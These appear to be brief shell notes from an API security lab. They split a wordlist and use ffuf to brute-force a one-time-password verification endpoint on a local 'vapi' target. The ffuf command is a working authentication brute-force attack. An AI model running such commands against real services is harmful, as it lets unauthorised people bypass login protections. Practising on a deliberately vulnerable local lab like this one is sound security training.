# Split into 5 files (modify -l for different number of files)
split -l 2000 -d wordlist.txt wordlist_part

## ffuf
ffuf -w list.txt -X POST -d '{"otp":"FUZZ"}' -H "Content-Type: application/json" -u http://localhost/vapi/api4/otp/verify --mc 200 -s